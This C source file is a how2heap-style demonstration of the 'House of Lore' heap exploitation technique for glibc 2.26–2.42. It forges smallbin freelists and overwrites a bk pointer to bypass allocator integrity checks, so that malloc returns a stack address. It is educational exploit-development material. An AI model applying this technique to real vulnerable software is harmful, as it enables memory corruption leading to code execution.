/*
Demonstration of the House of Lore of glibc 2.27-2.42
addapted by Imrane Haddaji (tabacc0)
Based on the original how2heap demo.
Linked and tested against glibc 2.26 to 2.42



  if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
	  if (__glibc_unlikely (bck->fd != victim))
	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;

[ ... ]
	      while (tcache->num_slots[tc_idx] != 0
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != NULL)
		    {
		      bck = tc_victim->bk;
		      set_inuse_bit_at_offset (tc_victim, nb);
[ ... ]
		      bin->bk = bck;
		      bck->fd = bin;

		      tcache_put (tc_victim, tc_idx);
[ ... ]
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>


int main(int argc, char * argv[]){

  char *init_tcache = malloc(0xa0);

  char *target_chunk[4] = {0};
  char **target = &target_chunk[2];

  printf( "\nWelcome to the House of Lore\n");

  printf( "This is a version that deals with SmallBin checks and changes in Tcache\n");
  printf( "size and allocation pattern\n");
  printf( "\nOur goal is to return a pointer in the stack , target : %p\n",target);
  printf( "\naccounting for metadata the target_chunk is : %p\n",target_chunk);


  printf( "Allocating the victim chunk, to avoid filling/emptying the Tcache , we will\n");
  printf( "allocate a Large-sized chunk and cut it in the unsorted bin\n");
  char **victim = malloc(0x510);
  printf( "Allocated victim on the heap at %p of size 0x520(with metadata)\n", victim);

  printf( "Allocating a guard chunk in order to avoid consolidating the top chunk\n"
		  "with the victim during the free()\n");
  char *guard = malloc(0x1000);
  printf( "Allocated the large chunk on the heap at %p\n", guard);
  printf( "Freeing victim, it will be inserted in the unsorted bin\n", victim);
  free(victim);
  printf( "\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted\n"
		  "bin's header address (libc addresses)\n");
  printf( "victim->fwd: %p\n", victim[0]);
  printf( "victim->bk: %p\n\n", victim[1]);
  printf( "Allocating a chunk that will be cut from victim in the unsorted bin\n");
  printf( "our allocation will be of size 0x400,so victim size is 0x110(with metadata)\n");
  char *cut = malloc(0x400);
  printf( "Our Victim has been pushed forward, update our victim pointer accordingly\n");
  victim = victim + 0x410/sizeof(victim);
  // victim-WORD_SIZE because we need to remove the header size 
  // in order to have the absolute address of the chunk
  char **victim_chunk = victim-2;
  printf( "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  printf( "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  char *put_smallbin = malloc(0x1000);
  printf( "The chunk that can't be handled by the unsorted bin, nor the SmallBin has\n"
		  "been allocated to %p\n", put_smallbin);

  printf( "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  printf( "victim->fwd: %p\n", victim[0]);
  printf( "victim->bk: %p\n\n", victim[1]);

  printf( "create a fake chunk list of 7 chunks, in the heap .\n");
  printf("we already have an inactive chunk that we used for guarding, use it\n");
  printf("as lists\n");

  char* (*fake_freelist)[4] = (char* (*)[4])guard ;

  for(int i=0; i<6; i++) {
    fake_freelist[i][3] = (char*) fake_freelist[i+1];
  }

  printf("\nNow we have fake list of size 16\n");
  printf( "fake free-list at %p\n", fake_freelist);

  printf("\nMake the last element of the fake list point to target_chunk\n");
  fake_freelist[6][3] = (char*)target_chunk;

  printf("Make the first element of the fake list's fd point to victim to bypass the SmallBin\n");
  printf("Corruption check\n");
  fake_freelist[0][2] = (char*)victim_chunk;





  //------------VULNERABILITY-----------

  printf( "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
  printf( "and make it point to our fake list\n");

  victim[1] = (char*)fake_freelist; 

  //------------------------------------


  printf( "Now allocating a chunk with size equal to the first one freed\n");
  printf( "This should fill the Tcache by using our fake chunk lists leaving \n");
  printf( "target\n");

  char *trigger = malloc(0x100);
  printf( "Now take all the fake chunks in tcache out\n");
  for(int i=0; i<7; i++) {char *silence_gcc = malloc(0x100);}


  printf( "Our target is now the head of the smallbin , but if we try to allocate it\n");
  printf( "the Tcache stashing loop will start , so we should fake a list again \n");
  printf( "and make target->bk point to the fake list ,we should also make \n" 
		  "the head of the list's fd point to target so we don't crash\n");

  for(int i=0; i<6; i++) {
    fake_freelist[i][3] = (char*) fake_freelist[i+1];
  }
  fake_freelist[6][3] = (char*)fake_freelist[6];
  printf("Make target chunk -> bk point to the fake list\n");
  target_chunk[3] =(char*) fake_freelist;

  printf("Make fake lists head ->fd point to target_chunk to bypass SmallBin check\n");
  fake_freelist[0][2] = (char*)target_chunk;
  printf( "Allocating now should return target\n");
  char **smallbin_head = malloc(0x100);
  printf( "\nchar *smallbin_head = malloc(0x100)\n");
  printf("\nassert(smallbin_head == target);\n");
  assert(smallbin_head == target);
}
